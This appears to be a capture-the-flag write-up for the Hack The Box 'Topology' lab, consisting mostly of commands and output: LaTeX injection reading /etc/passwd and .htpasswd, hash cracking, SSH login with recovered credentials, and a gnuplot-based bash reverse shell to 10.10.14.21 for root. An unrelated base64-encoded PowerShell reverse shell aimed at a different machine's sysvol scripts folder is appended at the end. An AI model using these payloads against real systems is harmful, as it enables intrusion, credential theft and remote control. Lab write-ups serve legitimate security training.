
Nmap scanning:

~~~
nmap 10.10.11.217 -sC -sV
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 12:01 EDT
Nmap scan report for 10.10.11.217
Host is up (0.44s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.10 seconds
~~~~


![[VirtualBox_kali_26_06_2023_16_51_08.png]]

webpage in the open port 

![[VirtualBox_kali_26_06_2023_16_51_23.png]]

redirected page

LaTeX allows two writing modes for mathematical expressions: the inline math mode and display math mode: **inline math mode is used to write formulas that are part of a paragraph**.

inline math mode syntax ($....$)

~~~
$\lstinputlisting{/etc/hosts}$
~~~

![[VirtualBox_kali_26_06_2023_16_51_44.png]]


~~~
$\lstinputlisting{/etc/passwd}$
~~~


![[VirtualBox_kali_26_06_2023_17_00_04.png]]


~~~
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hw=545  -H "Host: FUZZ.topology.htb" http://topology.htb
~~~


![[VirtualBox_kali_26_06_2023_17_38_07.png]]

![[VirtualBox_kali_04_07_2023_06_01_55.png]]

~~~
$\lstinputlisting{/var/www/dev/.htpasswd}$
~~~

![[VirtualBox_kali_26_06_2023_17_51_33.png]]

we find the password in hash type we decrypt with john tool

$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0  decrypt this 

~~~
john -w=/home/subhash/Downloads/rockyou.txt topology.txt
~~~


![[VirtualBox_kali_26_06_2023_18_50_11.png]]

username  : vdaisley
pass:calculus20

![[VirtualBox_kali_04_07_2023_05_56_53.png]]


~~~
ssh vdaisley@topology.htb
~~~

~~~
vdaisley@topology.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

vdaisley@topology:~$ ls
user.txt
vdaisley@topology:~$ cat user.txt
53e22684b427042e237215ac88b129d9
~~~


user.txt:53e22684b427042e237215ac88b129d9



![[VirtualBox_kali_04_07_2023_15_07_04.png]]

Payload
~~~
echo "system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.21/443 0>&1'\")" >asdf.plt
~~~


Reverse shell:

~~~
nc -lvnp 443
~~~


![[VirtualBox_kali_04_07_2023_15_06_47.png]]

root.txt
e7e3dff45dd2d11aa27cfae7cb60607e

finished 🔥🔥😁


Reference:
https://httpd.apache.org/docs/2.4/programs/htpasswd.html
https://www.kali.org/tools/wfuzz/
https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/
https://www.youtube.com/watch?v=H3SSO3B62U4&ab_channel=AbhishekMorla




'powershell -e JExIT1NUID0gIjEwLjEwLjE0LjQwIjsgJExQT1JUID0gOTAwMjsgJFRDUENsaWVudCA9IE5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCRMSE9TVCwgJExQT1JUKTsgJE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyAkU3RyZWFtUmVhZGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyLkF1dG9GbHVzaCA9ICR0cnVlOyAkQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQ7IHdoaWxlICgkVENQQ2xpZW50LkNvbm5lY3RlZCkgeyB3aGlsZSAoJE5ldHdvcmtTdHJlYW0uRGF0YUF2YWlsYWJsZSkgeyAkUmF3RGF0YSA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpOyAkQ29kZSA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkUmF3RGF0YSAtMSkgfTsgaWYgKCRUQ1BDbGllbnQuQ29ubmVjdGVkIC1hbmQgJENvZGUuTGVuZ3RoIC1ndCAxKSB7ICRPdXRwdXQgPSB0cnkgeyBJbnZva2UtRXhwcmVzc2lvbiAoJENvZGUpIDI+JjEgfSBjYXRjaCB7ICRfIH07ICRTdHJlYW1Xcml0ZXIuV3JpdGUoIiRPdXRwdXRgbiIpOyAkQ29kZSA9ICRudWxsIH0gfTsgJFRDUENsaWVudC5DbG9zZSgpOyAkTmV0d29ya1N0cmVhbS5DbG9zZSgpOyAkU3RyZWFtUmVhZGVyLkNsb3NlKCk7ICRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQ==' | Out-file -FilePath C:\Windows\sysvol\sysvol\blazorized.htb\scripts\A32FF3AEAA23\revshell.bat -Encoding ASCII
